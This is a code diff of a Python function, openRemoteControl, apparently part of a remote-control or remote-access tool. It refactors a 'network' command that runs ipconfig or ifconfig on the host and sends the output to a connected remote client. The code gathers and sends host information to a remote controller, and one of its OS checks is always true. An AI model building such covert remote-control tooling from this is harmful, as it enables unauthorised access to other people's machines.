@@ -207,38 +207,25 @@ def openRemoteControl(client):
             elif comando[0:4] == "rete" or comando[0:7] == "network":
                 try:
                     if platform.system() == "Windows":
-                        command = "ipconfig -all"
-
-                        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                                   stdin=subprocess.PIPE, shell=True)
-                        timer = Timer(20, process.terminate)
                         try:
-                            timer.start()
-                            stdout, stderr = process.communicate()
-                            output = stdout or stderr
-                        finally:
-                            timer.cancel()
+                            data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
+                        except:
+                            data = subprocess.check_output(['ipconfig']).decode('utf-8')
 
-                        output = output.decode('utf-8')
                         result = ["### Dati configurazione di rete ###\n"]
-                        for item in output:
+                        for item in data:
                             result.append(item)
 
                         result = ''.join(result)
                         client.send(((result)).encode())
                         time.sleep(1.5)
 
-                        #data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
-                        #result = ["### Dati configurazione di rete ###\n"]
-                        #for item in data:
-                            #result.append(item)
-
-                        #result = ''.join(result)
-                        #client.send(((result)).encode())
-                        #time.sleep(1.5)
-
                     elif platform.system() == "Darwin" or "Linux":
-                        data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
+                        try:
+                            data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
+                        except:
+                            data = subprocess.check_output(['ifconfig']).decode('utf-8')
+
                         result = ["### Dati configurazione di rete ###\n"]
                         for item in data:
                             result.append(item)
